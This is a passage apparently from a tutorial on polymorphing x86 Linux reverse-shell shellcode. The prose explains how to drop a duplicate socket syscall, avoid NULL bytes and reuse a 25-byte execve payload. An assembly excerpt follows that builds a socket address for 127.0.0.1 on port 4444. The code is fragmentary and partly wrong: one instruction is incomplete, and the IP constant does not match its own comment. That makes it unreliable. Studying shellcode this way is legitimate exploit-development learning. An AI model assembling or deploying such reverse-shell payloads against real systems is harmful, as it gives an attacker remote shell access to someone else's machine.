...
```
It's an old shellcode i don't know why it makes 2 socket syscalls but we can remove one, next we can change the ```socket``` syscall from ```0x66``` to ```0x167```, next we can work on registers xoring operations using ```mul```, then we will change the IP address in the ```connect``` syscall to ```127.0.0.1``` using the ```sub``` trick to avoid the presence of NULL bytes, then we can use the ```mov``` operation instead of some ```push```, next we can subtract some bytes also saving the socket pointer directly in EBX and last we can use our previous polymorphed ```execve``` shellcode of 25 bytes.
...
sub cl
mov [esp-4], ecx                ; unused char (0)

; the ip address 1.0.0.127 could be 4.3.3.130 to avoid NULL bytes
mov ecx, 0x69bea                 ; mov ip in ecx
sub ecx, 0x03030303              ; subtract 3.3.3.3 from ip
mov [esp-8], ecx                 ; load the real ip in the stack
mov word [esp-12], 0x5c11        ; port 4444
mov word [esp-16], 0x02          ; AF_INET family
sub esp, 16
lea ecx, [esp]
